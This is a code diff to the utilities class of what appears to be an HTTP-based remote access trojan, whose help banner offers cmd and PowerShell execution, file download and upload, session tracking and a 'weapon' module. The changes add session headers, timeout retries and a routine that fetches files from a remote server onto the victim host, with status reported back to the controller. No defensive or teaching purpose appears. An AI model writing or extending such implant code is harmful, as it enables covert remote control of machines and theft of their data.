@@ -12,11 +12,13 @@ class Utilities
         return "!#!\n  Spaghetti Overdose\n" +
             " ----------------------------------------------------------\n" +
             "   <command>               Run cmd command [Default]\n" +
-            "   download <file>         download file\n" +
-            "   exit               Close the client connection\n" +
+            "   download <file>         Download file\n" +
+            "   exit                    Close the client connection\n" +
             "   help                    Print this message\n" +
             "   powershell <command>    Run powershell command\n" +
-            "   session                 Get session ID\n";
+            "   session                 Get session ID\n" +
+            "   upload                  Upload file" +
+            "   weapon                  Use a weapon module\n";
 
     }
 
@@ -25,11 +27,13 @@ class Utilities
     {
         string initial = Directory.GetCurrentDirectory();
         Directory.SetCurrentDirectory(location);
+        byte[] fbyte = new byte[0];
         if (File.Exists(filename))
         {
-            return File.ReadAllBytes(filename);
+            fbyte = File.ReadAllBytes(filename);
         }
-        return new byte[0];
+        Directory.SetCurrentDirectory(initial);
+        return fbyte;
     }
 
 
@@ -90,18 +94,74 @@ class Utilities
     }
 
     // HTTP Get Request
-    public static string Get(string uri, string location)
+    public static string Get(string uri, string location, string sessionid)
     {
-        HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);
-        request.Headers.Add("Current-Location", location);
-        request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
+       try
+       {
+            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);
+            request.Headers.Add("Current-Location", location);
+            request.Headers.Add("Session-Id", sessionid);
+            request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
 
-        using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
-        using (Stream stream = response.GetResponseStream())
-        using (StreamReader reader = new StreamReader(stream))
+            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
+            using (Stream stream = response.GetResponseStream())
+            using (StreamReader reader = new StreamReader(stream))
+            {
+                return reader.ReadToEnd();
+            }
+       }
+       catch (WebException e)
         {
-            return reader.ReadToEnd();
+            if (e.Status == WebExceptionStatus.Timeout)
+            {
+                Post(uri, "#!#Request Timeout.. try again!");
+                return Get(uri, location, sessionid);
+            }
+            else throw;
         }
+    }
+
+    // HTTP Get Request for File upload
+    public static void GetFile(string target, string uri, string filename, string location, string sessionid)
+    {
+        string bkp_location = Directory.GetCurrentDirectory();
+        try
+        {
+            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(target);
+            request.Headers.Add("Current-Location", location);
+            request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
+
+            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
+            using (Stream stream = response.GetResponseStream())
+            {
+                int bufferSize = 1024;
+                byte[] buffer = new byte[bufferSize];
+                int bytesRead = 0;
+
+                Directory.SetCurrentDirectory(location);
+                FileStream fileStream = File.Create(filename);
+                while ((bytesRead = stream.Read(buffer, 0, bufferSize)) != 0)
+                {
+                    fileStream.Write(buffer, 0, bytesRead);
+                }
+                fileStream.Close();
+            }
+        }
+        catch (WebException e)
+        {
+            Directory.SetCurrentDirectory(bkp_location);
+            if (e.Status == WebExceptionStatus.Timeout)
+            {
+                Post(uri, "#!#Request Timeout.. try again!");
+                GetFile(target, uri, filename, location, sessionid);
+            }
+            else
+            {
+                Post(uri, "#!# -- Failed --");
+            }
+        }
+        Post(uri, "!#! -- Success --");
+        Directory.SetCurrentDirectory(bkp_location);
     }
 
     // HTTP Post Request
@@ -149,7 +209,7 @@ class Utilities
 
                 client.Headers.Add("File-Name", filename);
                 client.UploadData(fs_uri, method, content);
-                output = "-- Success --";
+                output = "!#! -- Success --";
             }
         }
         
